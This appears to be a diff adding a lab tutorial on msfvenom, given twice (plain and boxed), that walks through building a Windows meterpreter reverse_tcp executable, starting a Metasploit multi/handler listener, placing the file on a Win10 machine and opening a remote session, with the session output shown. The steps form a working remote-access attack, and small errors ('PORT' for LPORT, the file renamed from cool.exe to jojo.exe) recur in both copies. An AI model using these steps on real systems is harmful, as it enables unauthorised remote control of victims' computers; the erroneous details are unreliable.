@@ -1,0 +1,111 @@
+MSFvenom
+
+MSFvenom is a combination of MSFpayload and MSFencode, putting both of these tools 
+into a single Framework instance. msfvenom replaced both msfpayload and msfencode 
+as of June 8th, 2015.
+
+It is used to create various malware nd is based on metasploit.
+
+-> The advantages of msfvenom are:
+  -One single tool
+  -Standardized command line options
+  -Increased speed
+
+-> MSFvenom options:
+Here are some examples:
+  -p : choose the payload (--list payloads to list, --list-options for arguments).
+  -f : choose the format (--list formats to list)
+  -e : choose the encoder (--list encoders to list)
+  -a : the architecture to use (--list archs to list).
+  -o : the output name.
+  ...
+
+Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
+
+-> A real example:
+1. Create the malware.
+
+$ msfvenom -p windows/meterpreter/reverse_tcp     : a meterpreter
+           -a x86                                 : 32-bit machine
+           --platform windows                     : OS
+           -f exe                                 : .exe file
+           LHOST=<kali IP>                        : the kali machine
+           PORT=4444                              : connection port
+           -o /home/kali/cool.exe                 : the file name
+
+2. Prepare the kali machine
+$ msfconsole
+msf6> use exploit/multi/handler
+msf6> use payload windows/meterpreter/reverse_tcp
+msf6> set LHOST <kali IP>
+msf6> set LPORT 4444
+msf6> exploit
+
+3. Put cool.exe on the Win10 machine.
+
+4. Just launch jojo.exe and admire:
+[*] Started reverse TCP handler on 192.168.8.128:4444 
+[*] Sending stage (177734 bytes) to 192.168.8.180
+[*] Meterpreter session 1 opened (192.168.8.128:4444 -> 192.168.8.180:51414) at 2025-02-28 12:31:25 -0500
+
+The kali machine is now ready to play with win10.
+
+>@
+>@####################################################################################################### 
+>@#                                                                                                     #
+>@# [ MSFvenom ]                                                                                        #
+>@#                                                                                                     #
+>@# MSFvenom is a combination of MSFpayload and MSFencode, putting both of these tools into a single    #
+>@# Framework instance. msfvenom replaced both msfpayload and msfencode as of June 8th, 2015.           #
+>@#                                                                                                     #
+>@# It is used to create various malwares and is based on metasploit.                                   #
+>@#                                                                                                     #
+>@#-----------------------------------------------------------------------------------------------------#
+>@
+>@-> The advantages of msfvenom are:
+>@  -One single tool
+>@  -Standardized command line options
+>@  -Increased speed
+>@
+>@-> MSFvenom options:
+>@Here are some examples:
+>@  -p : choose the payload (--list payloads to list, --list-options for arguments).
+>@  -f : choose the format (--list formats to list)
+>@  -e : choose the encoder (--list encoders to list)
+>@  -a : the architecture to use (--list archs to list).
+>@  -o : the output name.
+>@  ...
+>@
+>@Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
+>@
+>@-> A real example:
+>@1. Create the malware.
+>@
+>@$ msfvenom -p windows/meterpreter/reverse_tcp     : a meterpreter
+>@           -a x86                                 : 32-bit machine
+>@           --platform windows                     : OS
+>@           -f exe                                 : .exe file
+>@           LHOST=<kali IP>                        : the kali machine
+>@           PORT=4444                              : connection port
+>@           -o /home/kali/cool.exe                 : the file name
+>@
+>@2. Prepare the kali machine
+>@$ msfconsole
+>@msf6> use exploit/multi/handler
+>@msf6> use payload windows/meterpreter/reverse_tcp
+>@msf6> set LHOST <kali IP>
+>@msf6> set LPORT 4444
+>@msf6> exploit
+>@
+>@3. Put cool.exe on the Win10 machine.
+>@
+>@4. Just launch jojo.exe and admire:
+>@[*] Started reverse TCP handler on 192.168.8.128:4444 
+>@[*] Sending stage (177734 bytes) to 192.168.8.180
+>@[*] Meterpreter session 1 opened (192.168.8.128:4444 -> 192.168.8.180:51414) 
+>@    at 2025-02-28 12:31:25 -0500
+>@
+>@The kali machine is now ready to play with win10.
+>@
+>@####################################################################################################### 
+>@#
